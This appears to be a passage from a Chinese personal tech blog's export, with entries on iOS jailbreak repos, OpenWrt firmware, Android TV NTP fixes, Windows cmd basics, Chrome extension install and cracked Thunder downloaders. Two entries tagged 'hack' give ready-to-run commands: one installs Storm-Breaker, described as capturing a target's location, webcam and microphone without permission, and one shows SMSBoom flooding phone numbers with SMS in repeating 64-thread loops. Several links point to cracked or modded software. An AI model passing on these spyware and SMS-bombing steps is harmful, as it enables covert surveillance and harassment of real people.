<p>Zetsu分屏官方源<br><a href="http://dcsyhi1998.github.io/">http://dcsyhi1998.github.io/</a><br><a href="https://repo.anamy.gay/">https://repo.anamy.gay/</a></p>
<p>Snowboard官方源<br><a href="https://sparkdev.me/">https://sparkdev.me/</a></p>
<p>搬运工源<a href="https://byg.iosios.net/">https://byg.iosios.net/</a></p>
<p>百度主题源<a href="https://zhuti.iosios.net/">https://zhuti.iosios.net/</a></p>
<p>来了老弟源<a href="https://laileld.github.io/repo">https://laileld.github.io/repo</a></p>
<p>wwg135源<a href="https://wwg135.github.io/">https://wwg135.github.io/</a></p>
<p>学习交流源<a href="https://flyx099.github.io/repo/">https://flyx099.github.io/repo/</a></p>
<p>菠萝美化源<a href="https://themepro.yourepo.com/">https://themepro.yourepo.com/</a></p>
<p>H5GG游戏官方源<br><a href="https://apt.h5gg.app/">https://apt.h5gg.app/</a></p>
<p>iGG官方源<br><a href="https://aquawu.github.io/igg/">https://aquawu.github.io/igg/</a></p>
<p>iosgods官方源<br><a href="https://iosgods.com/repo/">https://iosgods.com/repo/</a></p>
<h2 id="其他未分类源"><a href="#其他未分类源" class="headerlink" title="其他未分类源"></a><strong>其他未分类源</strong></h2><p><a href="https://huayuarc.cn/">https://huayuarc.cn/</a><br><a href="https://cydia.akemi.ai/">https://cydia.akemi.ai/</a><br><a href="https://repo.mazh.top/">https://repo.mazh.top/</a><br><a href="https://apt.geometricsoftware.se/">https://apt.geometricsoftware.se/</a><br><a href="https://repo.anthopak.dev/">https://repo.anthopak.dev</a><br><a href="https://www.yourepo.com/">https://www.yourepo.com/</a><br><a href="https://julio.hackyouriphone.org/">https://julio.hackyouriphone.org/</a><br><a href="https://0xkuj.yourepo.com/">https://0xkuj.yourepo.com</a><br><a href="https://iosign.tk/">https://iosign.tk/</a><br><a href="https://apt.autotouch.net/rootless">https://apt.autotouch.net/rootless</a><br><a href="http://tigisoftware.com/repo/">http://tigisoftware.com/repo/</a><br><a href="https://liam.page/oldabi/">https://liam.page/oldabi/</a><br><a href="https://cydiageek.yourepo.com/">https://cydiageek.yourepo.com/</a><br><a href="https://miro92.com/repo/">https://miro92.com/repo/</a><br><a href="https://nahtedetihw.github.io/">https://nahtedetihw.github.io/</a><br><a href="https://repo.icrazeios.com/">https://repo.icrazeios.com/</a><br><a href="https://p2kdev.github.io/repo/">https://p2kdev.github.io/repo/</a><br><a href="https://dhinakg.github.io/repo/">https://dhinakg.github.io/repo/</a><br><a href="https://repo.itznebbs.com/">https://repo.itznebbs.com/</a><br><a href="https://0xilis.github.io/rootless/">https://0xilis.github.io/rootless/</a><br><a href="https://ios.jjolano.me/">https://ios.jjolano.me/</a><br><a href="https://repo.ikghd.me/">https://repo.ikghd.me/</a><br><a href="https://cydia.rob311.com/repo/">https://cydia.rob311.com/repo/</a></p>
<h1 id="自用软件"><a href="#自用软件" class="headerlink" title="自用软件"></a>自用软件</h1><ol>
<li>App Store 快速切换账号</li>
<li>AppStore++</li>
<li>AppSync Unified - 关闭签名</li>
<li>AudioRecorder XS</li>
<li>AutoFaceUnlock</li>
<li>白描 Crack</li>
<li>DigitalBattery13 - 数字电池</li>
<li>DoubleTapLock - 双击锁屏</li>
<li>GoodWiFi - WiFi密码查看器</li>
<li>iCleaner Pro</li>
<li>KillApps - 一键后台清理</li>
<li>NFCWriter XS</li>
<li>PerfectTimeXS - 双行日期</li>
<li>Shadow - 屏蔽越狱</li>
<li>Slice 3 - 应用多开</li>
<li>微信净化</li>
<li>虚拟定位助手 - 系统GPS定位</li>
</ol>
]]></content>
      <categories>
        <category>os</category>
        <category>ios</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>ios</tag>
      </tags>
  </entry>
  <entry>
    <title>自用 nanopi r2s openwrt 固件分享</title>
    <url>/posts/3101338f/</url>
    <content><![CDATA[<h1 id="R2S-Minimal-2020-12-14-ROM"><a href="#R2S-Minimal-2020-12-14-ROM" class="headerlink" title="R2S-Minimal-2020-12-14-ROM"></a>R2S-Minimal-2020-12-14-ROM</h1><p>链接: <a href="https://pan.baidu.com/s/1M6Jgv9RnZeGfr4E9C2VUaA?pwd=787z">https://pan.baidu.com/s/1M6Jgv9RnZeGfr4E9C2VUaA?pwd=787z</a> 提取码: 787z 复制这段内容后打开百度网盘手机App，操作更方便哦<br>访问地址：192.168.2.1<br>后台密码：password</p>
<h1 id="balenaEtcher-v1-5-102"><a href="#balenaEtcher-v1-5-102" class="headerlink" title="balenaEtcher_v1.5.102"></a>balenaEtcher_v1.5.102</h1><p>链接: <a href="https://pan.baidu.com/s/1ROk82wg2f3ujhGNcQ5VJ2Q?pwd=xa22">https://pan.baidu.com/s/1ROk82wg2f3ujhGNcQ5VJ2Q?pwd=xa22</a> 提取码: xa22 复制这段内容后打开百度网盘手机App，操作更方便哦</p>
<h1 id="NanoPi-R2S详细介绍"><a href="#NanoPi-R2S详细介绍" class="headerlink" title="NanoPi R2S详细介绍"></a>NanoPi R2S详细介绍</h1><p><a href="https://www.yuque.com/friendlyelec/r2s/fzmeef">https://www.yuque.com/friendlyelec/r2s/fzmeef</a></p>
<h1 id="软路由固件-OpenWrt-x86-x64-精简版（2022-05-02更新）（只有SSR）"><a href="#软路由固件-OpenWrt-x86-x64-精简版（2022-05-02更新）（只有SSR）" class="headerlink" title="软路由固件 OpenWrt (x86_x64) 精简版（2022.05.02更新）（只有SSR）"></a>软路由固件 OpenWrt (x86_x64) 精简版（2022.05.02更新）（只有SSR）</h1><p><a href="https://wwm.lanzouw.com/icHCT09teged">https://wwm.lanzouw.com/icHCT09teged</a><br>密码:ama5</p>
<p>本次编译只保留以下常用插件：<br>LuCI —&gt; Applications —&gt; luci-app-accesscontrol #访问时间控制<br>LuCI —&gt; Applications —&gt; luci-app-arpbind #IP&#x2F;MAC绑定<br>LuCI —&gt; Applications —&gt; luci-app-autoreboot #定时重启<br>LuCI —&gt; Applications —&gt; luci-app-filetransfer #文件传输（可web安装ipk包）<br>LuCI —&gt; Applications —&gt; luci-app-firewall #添加防火墙<br>LuCI —&gt; Applications —&gt; luci-app-sfc #最新版 Turbo ACC网络加速<br>LuCI —&gt; Applications —&gt; luci-app-nlbwmon #网络带宽监视器<br>LuCI —&gt; Applications —&gt; luci-app-ramfree #释放内存<br>LuCI —&gt; Applications —&gt; luci-app-sqm #流量智能队列管理（QOS）<br>LuCI —&gt; Applications —&gt; luci-app-55R饮料 #不忘初心<br>LuCI —&gt; Applications —&gt; luci-app-upnp #通用即插即用UPnP（端口自动转发）<br>LuCI —&gt; Applications —&gt;luci-app-wol 网络唤醒</p>
<p>Extra packages —&gt; ipv6helper #支持 ipv6</p>
<p>固件的初始访问地址：192.168.1.1 用户名：root 登陆密码：password</p>
]]></content>
      <categories>
        <category>os</category>
        <category>openwrt</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>openwrt</tag>
      </tags>
  </entry>
  <entry>
    <title>android tv 调整 ntp 时间解决 wifi 联网问题</title>
    <url>/posts/ff153753/</url>
    <content><![CDATA[<h1 id="方法采用无线adb方式-无需连接数据线-只要保证在同一个局域网即可"><a href="#方法采用无线adb方式-无需连接数据线-只要保证在同一个局域网即可" class="headerlink" title="方法采用无线adb方式 无需连接数据线 只要保证在同一个局域网即可"></a>方法采用无线adb方式 无需连接数据线 只要保证在同一个局域网即可</h1><h1 id="1、打开adb（设置-设备偏好设置-关于-连续点击4次内部版本号，开发者选项-如果有网络调试开关就打开，如果没有就打开usb调试）"><a href="#1、打开adb（设置-设备偏好设置-关于-连续点击4次内部版本号，开发者选项-如果有网络调试开关就打开，如果没有就打开usb调试）" class="headerlink" title="1、打开adb（设置-设备偏好设置-关于-连续点击4次内部版本号，开发者选项-如果有网络调试开关就打开，如果没有就打开usb调试）"></a>1、打开adb（设置-设备偏好设置-关于-连续点击4次内部版本号，开发者选项-如果有网络调试开关就打开，如果没有就打开usb调试）</h1><h1 id="2、下载adb工具包，连接adb"><a href="#2、下载adb工具包，连接adb" class="headerlink" title="2、下载adb工具包，连接adb"></a>2、下载adb工具包，连接adb</h1><p><a href="https://wwm.lanzouw.com/iIbZ609uj46j">https://wwm.lanzouw.com/iIbZ609uj46j</a><br>密码:dqa1</p>
<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">adb connect <span class="number">192</span>.<span class="number">168</span>.<span class="number">6</span>.<span class="number">106</span></span><br></pre></td></tr></table></figure>
<h1 id="3、写入新的ntp服务器地址"><a href="#3、写入新的ntp服务器地址" class="headerlink" title="3、写入新的ntp服务器地址"></a>3、写入新的ntp服务器地址</h1><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">adb shell settings put global ntp_server ntp1.aliyun.com</span><br></pre></td></tr></table></figure>
<p>备用地址</p>
<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">dns1.synet.edu.cn</span><br><span class="line">news.neu.edu.cn</span><br><span class="line">dns.sjtu.edu.cm</span><br><span class="line">dns2.synet.edu.cn</span><br><span class="line">ntp.glnet.edu.cn</span><br><span class="line">ntp1.aliyun.com</span><br><span class="line">ntp2.aliyun.com</span><br><span class="line">ntp3.aliyun.com</span><br><span class="line">ntp4.aliyun.com</span><br><span class="line">ntp5.aliyun.com</span><br><span class="line">ntp6.aliyun.com</span><br><span class="line">ntp7.aliyun.com</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>os</category>
        <category>android</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>android</tag>
      </tags>
  </entry>
  <entry>
    <title>storm-breaker获取设备信息，位置，摄像头和麦克风</title>
    <url>/posts/d9449653/</url>
    <content><![CDATA[<h1 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h1><ol>
<li>无需任何权限即可获取设备信息</li>
<li>访问位置 [智能手机]</li>
<li>访问网络摄像头</li>
<li>访问麦克风</li>
</ol>
<h1 id="在-Kali-Linux-上安装"><a href="#在-Kali-Linux-上安装" class="headerlink" title="在 Kali Linux 上安装"></a>在 Kali Linux 上安装</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/ultrasecurity/Storm-Breaker</span><br><span class="line">cd Storm-Breaker</span><br><span class="line">sudo bash install.sh</span><br><span class="line">sudo python3 -m pip install -r requirements.txt</span><br><span class="line">sudo python3 st.py</span><br></pre></td></tr></table></figure>

<p>via <a href="https://github.com/ultrasecurity/Storm-Breaker">https://github.com/ultrasecurity/Storm-Breaker</a></p>
]]></content>
      <categories>
        <category>hack</category>
        <category>stormbreaker</category>
      </categories>
      <tags>
        <tag>hack</tag>
        <tag>stormbreaker</tag>
      </tags>
  </entry>
  <entry>
    <title>windows cmd/powershell 常用命令</title>
    <url>/posts/a636a67/</url>
    <content><![CDATA[<h1 id="如何打开-CMD-命令提示符窗口"><a href="#如何打开-CMD-命令提示符窗口" class="headerlink" title="如何打开 CMD 命令提示符窗口"></a>如何打开 CMD 命令提示符窗口</h1><p>方法一：开始菜单 -&gt; Windows 系统 -&gt; 命令提示符。<br>方法二：按下快捷键 Win + R 打开运行，输入 cmd 回车。<br>方法三：点击任务栏搜索按钮，搜索 cmd 并打开。<br>方法四：在资源管理器的地址栏输入 cmd 并回车，cmd 打开后会自动定位到当前目录。<br>方法五：右键点击开始菜单的 Win 图标 -&gt; 命令提示符。</p>
<h1 id="CMD-常用命令总结"><a href="#CMD-常用命令总结" class="headerlink" title="CMD 常用命令总结"></a>CMD 常用命令总结</h1><p>输入 help，查看帮助；<br>Tab 键，自动补全；<br>上&#x2F;下方向键，查看历史命令；<br>右键窗口标题栏 -&gt; 属性，可以修改外观样式。</p>
<h1 id="关机、重启、注销、休眠、定时"><a href="#关机、重启、注销、休眠、定时" class="headerlink" title="关机、重启、注销、休眠、定时"></a>关机、重启、注销、休眠、定时</h1><p>关机：shutdown &#x2F;s<br>重启：shutdown &#x2F;r<br>注销：shutdown &#x2F;l<br>休眠：shutdown &#x2F;h &#x2F;f<br>取消关机：shutdown &#x2F;a<br>定时关机：shutdown &#x2F;s &#x2F;t 3600（3600 秒后关机）</p>
<h1 id="目录操作"><a href="#目录操作" class="headerlink" title="目录操作"></a>目录操作</h1><p>切换目录，进入指定文件夹：<br>切换磁盘：d:（进入 d 盘）<br>切换磁盘和目录：cd &#x2F;d d:&#x2F;test（进入 d 盘 test 文件夹）<br>进入文件夹：cd \test1\test2（进入 test2 文件夹）<br>返回根目录：cd <br>回到上级目录：cd ..<br>新建文件夹：md test<br>显示目录内容：<br>显示目录中文件列表：dir<br>显示目录结构：tree d:\test（d 盘 test 目录）<br>显示当前目录位置：cd<br>显示指定磁盘的当前目录位置：cd d:</p>
<h1 id="网络操作"><a href="#网络操作" class="headerlink" title="网络操作"></a>网络操作</h1><p>延迟和丢包率：ping ip&#x2F;域名<br>Ping 测试 5 次：ping ip&#x2F;域名 -n 5<br>清除本地 DNS 缓存：ipconfig &#x2F;flushdns<br>路由追踪：tracert ip&#x2F;域名</p>
<h1 id="进程-服务操作"><a href="#进程-服务操作" class="headerlink" title="进程&#x2F;服务操作"></a>进程&#x2F;服务操作</h1><h2 id="进程管理："><a href="#进程管理：" class="headerlink" title="进程管理："></a>进程管理：</h2><p>显示当前正在运行的进程：tasklist<br>运行程序或命令：start 程序名<br>结束进程，按名称：taskkill &#x2F;im notepad.exe（关闭记事本）<br>结束进程，按 PID：taskkill &#x2F;pid 1234（关闭 PID 为 1234 的进程）</p>
<h2 id="服务管理："><a href="#服务管理：" class="headerlink" title="服务管理："></a>服务管理：</h2><p>显示当前正在运行的服务：net start<br>启动指定服务：net start 服务名<br>停止指定服务：net stop 服务名<br>保存为 .bat 可执行文件<br>我们可以将常用的命令输入记事本中，并保存为后缀为 .bat 的可执行文件。<br>以后只要双击该文件即可执行指定命令；将文件放入系统【启动】目录中，可以实现开机自动运行。<br>注：启动目录位置：[C:\Users\用户名\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup]</p>
<h1 id="使用实践"><a href="#使用实践" class="headerlink" title="使用实践"></a>使用实践</h1><h2 id="使用示例-1："><a href="#使用示例-1：" class="headerlink" title="使用示例 1："></a>使用示例 1：</h2><p>在资源管理器卡死时，我们可以使用 taskkill 命令重启。将下面命令保存为 ReExplorer.bat，在需要时双击即可强制重启资源管理器。或直接打开 CMD 运行命令也可以。</p>
<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line"><span class="built_in">taskkill</span> /f /im explorer.exe &amp; <span class="built_in">start</span> explorer.exe</span><br></pre></td></tr></table></figure>
<h2 id="使用示例-2："><a href="#使用示例-2：" class="headerlink" title="使用示例 2："></a>使用示例 2：</h2><p>迅雷会在后台自动运行 ThunderPlatform.exe 进程和 XLServicePlatform 服务，如果当前没有使用迅雷的话显然没必要。<br>我们可以将如下代码保存为 killxl.bat，并放入【启动】目录，开机后会自动运行该脚本，清除这两个进程。</p>
<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> stop XLServicePlatform</span><br><span class="line"><span class="built_in">taskkill</span> /F /im ThunderPlatform.exe</span><br></pre></td></tr></table></figure>
<p>显示网络回话列表，查看有没有别的ip在监听</p>
<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> session</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>os</category>
        <category>windows</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>chrome开启拖入安装 .crx 扩展（非离线解压安装）</title>
    <url>/posts/b8735002/</url>
    <content><![CDATA[<h1 id="开启-拖入安装扩展-功能"><a href="#开启-拖入安装扩展-功能" class="headerlink" title="开启 [拖入安装扩展] 功能"></a>开启 [拖入安装扩展] 功能</h1><p>Chrome 浏览器，地址栏输入并回车：chrome:&#x2F;&#x2F;flags&#x2F;#extensions-on-chrome-urls<br>如下图所示，将 Disabled 改为 Enabled ，并点击下面的 [Relaunch] 重启浏览器。<br><img src="/img/crx/1.webp" alt="bdcd34b25d6f2ad710da60bcac928a69"><br>Chrome 浏览器重启后，就支持拖入安装扩展了。<br>注意：浏览器可能会一直提示你可能有稳定性和安全风险巴拉巴拉……<br>嫌烦的话可以先关闭该功能，需要安装扩展的时候再打开，反正也不是天天安装扩展。</p>
<h1 id="首先进入浏览器扩展程序页面：Chrome-浏览器，点击浏览器右上角的三个点-更多工具-扩展程序，或者浏览器地址栏输入并回车：-chrome-extensions-edge-extensions"><a href="#首先进入浏览器扩展程序页面：Chrome-浏览器，点击浏览器右上角的三个点-更多工具-扩展程序，或者浏览器地址栏输入并回车：-chrome-extensions-edge-extensions" class="headerlink" title="首先进入浏览器扩展程序页面：Chrome 浏览器，点击浏览器右上角的三个点 - 更多工具 - 扩展程序，或者浏览器地址栏输入并回车： chrome:&#x2F;&#x2F;extensions&#x2F; &#x2F;  edge:&#x2F;&#x2F;extensions&#x2F;"></a>首先进入浏览器扩展程序页面：Chrome 浏览器，点击浏览器右上角的三个点 - 更多工具 - 扩展程序，或者浏览器地址栏输入并回车： chrome:&#x2F;&#x2F;extensions&#x2F; &#x2F;  edge:&#x2F;&#x2F;extensions&#x2F;</h1><p><img src="/img/crx/2.webp" alt="94c36eb8d71ac17ff96f5f16171f4456"></p>
<h1 id="需要开启-开发者模式-后才能拖入安装扩展！"><a href="#需要开启-开发者模式-后才能拖入安装扩展！" class="headerlink" title="需要开启 [开发者模式] 后才能拖入安装扩展！"></a>需要开启 [开发者模式] 后才能拖入安装扩展！</h1><p><img src="/img/crx/3.webp" alt="36cee3bed07cedd3c06e95aab54f6001"></p>
<h1 id="将扩展文件-crx-拖入该页面，可以看到如下图所示的提示。然后点击-添加扩展程序-按钮后就会看到扩展安装成功了！"><a href="#将扩展文件-crx-拖入该页面，可以看到如下图所示的提示。然后点击-添加扩展程序-按钮后就会看到扩展安装成功了！" class="headerlink" title="将扩展文件 .crx 拖入该页面，可以看到如下图所示的提示。然后点击 [添加扩展程序] 按钮后就会看到扩展安装成功了！"></a>将扩展文件 .crx 拖入该页面，可以看到如下图所示的提示。然后点击 [添加扩展程序] 按钮后就会看到扩展安装成功了！</h1><p><img src="/img/crx/4.webp" alt="0be5a61b0e9681f58bd659c766a2c42f"><br><img src="/img/crx/5.webp" alt="dff7f48e514a8f48701808f2a3430337"><br><img src="/img/crx/6.webp" alt="e2c4d5f5367411656c617fb0b275ddef"></p>
]]></content>
      <categories>
        <category>web</category>
        <category>chrome</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>chrome</tag>
      </tags>
  </entry>
  <entry>
    <title>短信轰炸</title>
    <url>/posts/b7d1784f/</url>
    <content><![CDATA[<p>使用前必须更新一遍最新接口 </p>
<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">smsboom_pyinstall.exe update</span><br></pre></td></tr></table></figure>
<p>使用示例 启动64个线程,轰&#x2F;&#x2F;炸一个人的手机号(198xxxxxxxx),只轰&#x2F;&#x2F;炸一波。</p>
<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">smsboom_pyinstall.exe run -t <span class="number">64</span> -p <span class="number">198</span>xxxxxxxxx</span><br></pre></td></tr></table></figure>
<p>启动64个线程,轰&#x2F;&#x2F;炸多个人的手机号(19xxxxxxx),启动循环轰&#x2F;&#x2F;炸，每个循环间隔60秒</p>
<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">smsboom_pyinstall.exe run -t <span class="number">64</span> -p <span class="number">198</span>xxxxxxxxx -s -i <span class="number">60</span></span><br></pre></td></tr></table></figure>
<p>启动64个线程,轰&#x2F;&#x2F;炸多个人的手机号(138xxx,139xxxx),启动循环轰&#x2F;&#x2F;炸,每个循环间隔60秒。</p>
<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">smsboom_pyinstall.exe run -t <span class="number">64</span> -p <span class="number">138</span>xxxxxxxx -p <span class="number">139</span>xxxxxxxx -s -i <span class="number">60</span></span><br></pre></td></tr></table></figure>
<p>命令参数说</p>
<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">python smsboom.py run --<span class="built_in">help</span></span><br><span class="line"><span class="function">Usage: <span class="title">smsboom.py</span> <span class="title">run</span> [<span class="title">OPTIONS</span>]</span></span><br><span class="line"><span class="function">传入线程数和手机号启动轰//炸,支持多手机号</span></span><br><span class="line"><span class="function"><span class="title">Options</span>: </span></span><br><span class="line"><span class="function">-<span class="title">t</span>, --<span class="title">thread</span> <span class="title">INTEGER</span> 线程数(默认64) </span></span><br><span class="line"><span class="function">-<span class="title">p</span>, --<span class="title">phone</span> <span class="title">TEXT</span> 手机号,可传入多个再使用-<span class="title">p</span>传递 [<span class="title">required</span>] </span></span><br><span class="line"><span class="function">-<span class="title">s</span>, --<span class="title">super</span> 循环模式 </span></span><br><span class="line"><span class="function">-<span class="title">i</span>, --<span class="title">interval</span> <span class="title">INTEGER</span> 循环间隔时间(默认60<span class="title">s</span>) </span></span><br><span class="line"><span class="function">--<span class="title">help</span> <span class="title">Show</span> <span class="title">this</span> <span class="title">message</span> <span class="title">and</span> <span class="title">exit</span>. </span></span><br></pre></td></tr></table></figure>
<p>短信压力测试&#x2F;短信轰炸地址 本程序仅供娱乐，禁止滥用 和二次 贩卖盈利. 禁止用于商业用途. 其他大佬用法请参考项目地址。 </p>
<p>GitHub地址：<a href="https://github.com/WhaleFell/SMSBoom">https://github.com/WhaleFell/SMSBoom</a><br>下载地址：<a href="https://github.com/OpenEthan/SMSBoom/releases">https://github.com/OpenEthan/SMSBoom/releases</a></p>
]]></content>
      <categories>
        <category>hack</category>
        <category>smsbomber</category>
      </categories>
      <tags>
        <tag>hack</tag>
        <tag>smsbomber</tag>
      </tags>
  </entry>
  <entry>
    <title>不限速版迅雷和可代替迅雷的种子磁力下载软件</title>
    <url>/posts/bb3d7d51/</url>
    <content><![CDATA[<h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h2 id="电脑版迅雷"><a href="#电脑版迅雷" class="headerlink" title="电脑版迅雷"></a>电脑版迅雷</h2><p><a href="https://wwm.lanzouw.com/iu5cT0h7gqda">https://wwm.lanzouw.com/iu5cT0h7gqda</a> 密码:dbun</p>
<h2 id="迅雷单文件11-1-8-1418"><a href="#迅雷单文件11-1-8-1418" class="headerlink" title="迅雷单文件11.1.8.1418"></a>迅雷单文件11.1.8.1418</h2><p><a href="https://wwm.lanzouw.com/isHlT0h7hb8b">https://wwm.lanzouw.com/isHlT0h7hb8b</a> 密码:6wdq</p>
<h2 id="Thunder9-5补充稳定版"><a href="#Thunder9-5补充稳定版" class="headerlink" title="Thunder9.5补充稳定版"></a>Thunder9.5补充稳定版</h2><p><a href="https://wwm.lanzouw.com/iKlZ80h7e4zi">https://wwm.lanzouw.com/iKlZ80h7e4zi</a> 密码:d40f</p>
<h2 id="迅雷5-8绿色去广告支持磁力"><a href="#迅雷5-8绿色去广告支持磁力" class="headerlink" title="迅雷5.8绿色去广告支持磁力"></a>迅雷5.8绿色去广告支持磁力</h2><p><a href="https://wwm.lanzouw.com/i6AG50dypx6h">https://wwm.lanzouw.com/i6AG50dypx6h</a> 密码:goq3</p>
<h2 id="BitComet-Stable-v1-94-9-11"><a href="#BitComet-Stable-v1-94-9-11" class="headerlink" title="BitComet Stable v1.94.9.11"></a>BitComet Stable v1.94.9.11</h2><p><a href="https://wwm.lanzouw.com/ie61C0dr5xti">https://wwm.lanzouw.com/ie61C0dr5xti</a> 密码:3j5c</p>
<h2 id="uTorrent（磁力和bt都可以下载）"><a href="#uTorrent（磁力和bt都可以下载）" class="headerlink" title="uTorrent（磁力和bt都可以下载）"></a>uTorrent（磁力和bt都可以下载）</h2><p><a href="https://wwm.lanzouw.com/iivGF0dr4x7a">https://wwm.lanzouw.com/iivGF0dr4x7a</a> 密码:6uxu</p>
<h2 id="迅雷11-v11-1-11-1618-去广告本地SVIP绿色精简版"><a href="#迅雷11-v11-1-11-1618-去广告本地SVIP绿色精简版" class="headerlink" title="迅雷11_v11.1.11.1618_去广告本地SVIP绿色精简版"></a>迅雷11_v11.1.11.1618_去广告本地SVIP绿色精简版</h2><p><a href="https://wwm.lanzouw.com/ixtdh0dr3pji">https://wwm.lanzouw.com/ixtdh0dr3pji</a> 密码:br1b</p>
<h2 id="不限速版迅雷（不能过版权）"><a href="#不限速版迅雷（不能过版权）" class="headerlink" title="不限速版迅雷（不能过版权）"></a>不限速版迅雷（不能过版权）</h2><p><a href="https://wwm.lanzouw.com/iN71809dl5ti">https://wwm.lanzouw.com/iN71809dl5ti</a> 密码:dpuw</p>
<h2 id="文件蜈蚣"><a href="#文件蜈蚣" class="headerlink" title="文件蜈蚣"></a>文件蜈蚣</h2><p><a href="https://wwm.lanzouw.com/iefD90blolgj">https://wwm.lanzouw.com/iefD90blolgj</a> 密码:ccpe</p>
<h2 id="Hitomi-downloader"><a href="#Hitomi-downloader" class="headerlink" title="Hitomi_downloader"></a>Hitomi_downloader</h2><p><a href="https://wwm.lanzouw.com/iSoEF0blotfg">https://wwm.lanzouw.com/iSoEF0blotfg</a> 密码:88u7</p>
<h2 id="motrix"><a href="#motrix" class="headerlink" title="motrix"></a>motrix</h2><p><a href="https://motrix.app/zh-CN/">https://motrix.app/zh-CN/</a></p>
<h2 id="Qdown"><a href="#Qdown" class="headerlink" title="Qdown"></a>Qdown</h2><p><a href="https://lightzhan.xyz/index.php/qdown/">https://lightzhan.xyz/index.php/qdown/</a></p>
<h2 id="xdown"><a href="#xdown" class="headerlink" title="xdown"></a>xdown</h2><p><a href="https://xdown.org/">https://xdown.org/</a></p>
<h1 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h1><h2 id="xunleiThunderQ-pkg-https-wwm-lanzouw-com-iavWh0cn1ofg-密码-8idq"><a href="#xunleiThunderQ-pkg-https-wwm-lanzouw-com-iavWh0cn1ofg-密码-8idq" class="headerlink" title="xunleiThunderQ.pkg https://wwm.lanzouw.com/iavWh0cn1ofg 密码:8idq"></a>xunleiThunderQ.pkg <a href="https://wwm.lanzouw.com/iavWh0cn1ofg">https://wwm.lanzouw.com/iavWh0cn1ofg</a> 密码:8idq</h2><h2 id="Thunder-6-6-6-6666-mac-https-wwm-lanzouw-com-iIBlw0cn1o3e-密码-hk3z"><a href="#Thunder-6-6-6-6666-mac-https-wwm-lanzouw-com-iIBlw0cn1o3e-密码-hk3z" class="headerlink" title="Thunder_6.6.6_(6666)__mac https://wwm.lanzouw.com/iIBlw0cn1o3e 密码:hk3z"></a>Thunder_6.6.6_(6666)__mac <a href="https://wwm.lanzouw.com/iIBlw0cn1o3e">https://wwm.lanzouw.com/iIBlw0cn1o3e</a> 密码:hk3z</h2><h2 id="Thunder-8-8-8无限制版-dmg-https-wwm-lanzouw-com-iYTZS0cn2brg-密码-6ks9"><a href="#Thunder-8-8-8无限制版-dmg-https-wwm-lanzouw-com-iYTZS0cn2brg-密码-6ks9" class="headerlink" title="Thunder-8.8.8无限制版.dmg https://wwm.lanzouw.com/iYTZS0cn2brg 密码:6ks9"></a>Thunder-8.8.8无限制版.dmg <a href="https://wwm.lanzouw.com/iYTZS0cn2brg">https://wwm.lanzouw.com/iYTZS0cn2brg</a> 密码:6ks9</h2><h2 id="Thunder-9-9-9-2844-dmg-https-wwm-lanzouw-com-iYjX40cn5b7e-密码-94jy"><a href="#Thunder-9-9-9-2844-dmg-https-wwm-lanzouw-com-iYjX40cn5b7e-密码-94jy" class="headerlink" title="Thunder-9.9.9.2844.dmg https://wwm.lanzouw.com/iYjX40cn5b7e 密码:94jy"></a>Thunder-9.9.9.2844.dmg <a href="https://wwm.lanzouw.com/iYjX40cn5b7e">https://wwm.lanzouw.com/iYjX40cn5b7e</a> 密码:94jy</h2><h2 id="Motrix-1-6-11-dmg-https-wwm-lanzouw-com-iBH2c0cwrfna-密码-faxi"><a href="#Motrix-1-6-11-dmg-https-wwm-lanzouw-com-iBH2c0cwrfna-密码-faxi" class="headerlink" title="Motrix-1.6.11.dmg https://wwm.lanzouw.com/iBH2c0cwrfna 密码:faxi"></a>Motrix-1.6.11.dmg <a href="https://wwm.lanzouw.com/iBH2c0cwrfna">https://wwm.lanzouw.com/iBH2c0cwrfna</a> 密码:faxi</h2><h1 id="安卓-Android"><a href="#安卓-Android" class="headerlink" title="安卓 Android"></a>安卓 Android</h1><h2 id="迅雷去广告不限速"><a href="#迅雷去广告不限速" class="headerlink" title="迅雷去广告不限速"></a>迅雷去广告不限速</h2><p><a href="https://wwm.lanzouw.com/i2OTZ0bxlw5i">https://wwm.lanzouw.com/i2OTZ0bxlw5i</a> 密码:86ec</p>
<h2 id="手机迅雷2022最新版本v9-9-9带云盘版"><a href="#手机迅雷2022最新版本v9-9-9带云盘版" class="headerlink" title="手机迅雷2022最新版本v9.9.9带云盘版"></a>手机迅雷2022最新版本v9.9.9带云盘版</h2><p><a href="https://wwm.lanzouw.com/ie9cU0crlm2f">https://wwm.lanzouw.com/ie9cU0crlm2f</a> 密码:1ibx</p>
<h2 id="安卓迅雷（无需登录就可以满速下载）"><a href="#安卓迅雷（无需登录就可以满速下载）" class="headerlink" title="安卓迅雷（无需登录就可以满速下载）"></a>安卓迅雷（无需登录就可以满速下载）</h2><p><a href="https://wwm.lanzouw.com/i5fRz0crllif">https://wwm.lanzouw.com/i5fRz0crllif</a> 密码:25vi</p>
<h2 id="迅雷-7-3-0-Pro-mod-apk"><a href="#迅雷-7-3-0-Pro-mod-apk" class="headerlink" title="迅雷 7.3.0 Pro mod.apk"></a>迅雷 7.3.0 Pro mod.apk</h2><p><a href="https://wwm.lanzouw.com/ipEoU0dr2gji">https://wwm.lanzouw.com/ipEoU0dr2gji</a> 密码:atbc</p>
